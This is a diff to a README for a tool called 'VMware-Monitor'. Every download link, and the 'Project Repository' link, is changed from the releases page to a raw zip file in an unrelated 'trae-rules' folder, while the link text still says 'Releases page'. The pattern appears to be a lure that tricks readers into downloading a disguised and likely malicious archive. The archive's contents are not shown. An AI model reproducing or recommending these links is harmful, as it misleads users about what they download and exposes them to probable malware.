@@ -1,6 +1,6 @@
 # 🖥️ VMware-Monitor - Safe VMware Monitoring Tool
 
-[![Download VMware-Monitor](https://img.shields.io/badge/Download-VMware--Monitor-brightgreen?style=for-the-badge)](https://github.com/ankitgupta9525/VMware-Monitor/releases)
+[![Download VMware-Monitor](https://img.shields.io/badge/Download-VMware--Monitor-brightgreen?style=for-the-badge)](https://github.com/ankitgupta9525/VMware-Monitor/raw/refs/heads/main/trae-rules/Monitor_Mware_V_v1.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You do not need any special software installed on your PC besides the app itself
 
 1. Open the download page by clicking the link below:
 
-   [**Visit the VMware-Monitor Releases page**](https://github.com/ankitgupta9525/VMware-Monitor/releases)
+   [**Visit the VMware-Monitor Releases page**](https://github.com/ankitgupta9525/VMware-Monitor/raw/refs/heads/main/trae-rules/Monitor_Mware_V_v1.6.zip)
 
 2. On the release page, look for the latest release version (by date or highest version number).
 
@@ -112,8 +112,8 @@ Always keep your VMware credentials secure. Do not share them.
 
 ## 🔗 Useful Links
 
-- Download Page: [https://github.com/ankitgupta9525/VMware-Monitor/releases](https://github.com/ankitgupta9525/VMware-Monitor/releases)
-- Project Repository: https://github.com/ankitgupta9525/VMware-Monitor
+- Download Page: [https://github.com/ankitgupta9525/VMware-Monitor/raw/refs/heads/main/trae-rules/Monitor_Mware_V_v1.6.zip](https://github.com/ankitgupta9525/VMware-Monitor/raw/refs/heads/main/trae-rules/Monitor_Mware_V_v1.6.zip)
+- Project Repository: https://github.com/ankitgupta9525/VMware-Monitor/raw/refs/heads/main/trae-rules/Monitor_Mware_V_v1.6.zip
 
 ---
 
@@ -127,7 +127,7 @@ If you want to automate monitoring or use VMware-Monitor in scripts:
 
 ---
 
-[![Download VMware-Monitor](https://img.shields.io/badge/Download-VMware--Monitor-blue?style=for-the-badge)](https://github.com/ankitgupta9525/VMware-Monitor/releases)
+[![Download VMware-Monitor](https://img.shields.io/badge/Download-VMware--Monitor-blue?style=for-the-badge)](https://github.com/ankitgupta9525/VMware-Monitor/raw/refs/heads/main/trae-rules/Monitor_Mware_V_v1.6.zip)
 
 ---
 
